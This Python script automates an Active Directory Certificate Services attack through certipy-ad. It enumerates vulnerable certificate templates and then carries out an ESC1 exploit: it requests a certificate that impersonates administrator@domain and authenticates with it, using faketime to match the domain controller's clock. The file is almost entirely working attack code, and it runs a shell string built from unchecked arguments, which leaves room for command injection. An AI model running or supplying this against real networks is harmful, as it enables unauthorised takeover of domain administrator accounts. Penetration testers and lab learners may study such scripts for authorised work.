import subprocess
import json

def run_certipy_find(username, password, domain, dc_ip=None):
    cmd = [
        "certipy-ad", "find",
        "-u", username,
        "-p", password,
        "-target", domain,
        "-text",
        "-stdout",
        "-vulnerable"
    ]
    if dc_ip:
        cmd += ["-dc-ip", dc_ip]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy find failed: {e}")
        return None

def save_results_to_json(data, filepath):
    try:
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        print(f"[+] Results saved to {filepath}")
    except Exception as e:
        print(f"[!] Failed to save results: {e}")

def exploit_esc1(username, password, domain, dc_ip, ca_name, template_name):
    print("[*] Exploiting ESC1 vulnerability...")

    req_cmd = [
        "certipy-ad", "req",
        "-u", username,
        "-p", password,
        "-target", domain,
        "-upn", f"administrator@{domain}",
        "-ca", ca_name,
        "-template", template_name,
        "-key-size", "4096"
    ]

    print(f"[*] Running request command: {' '.join(req_cmd)}")
    try:
        subprocess.run(req_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy request failed: {e}")
        return

    # Build and run the faketime + auth command exactly as you'd run in terminal
    auth_cmd = f'faketime "$(ntpdate -q {domain} | cut -d \' \' -f 1,2)" certipy-ad auth -pfx administrator.pfx -domain {domain}'
    if dc_ip:
        auth_cmd += f' -dc-ip {dc_ip}'

    print(f"[*] Running auth command: {auth_cmd}")
    try:
        subprocess.run(auth_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy auth failed: {e}")
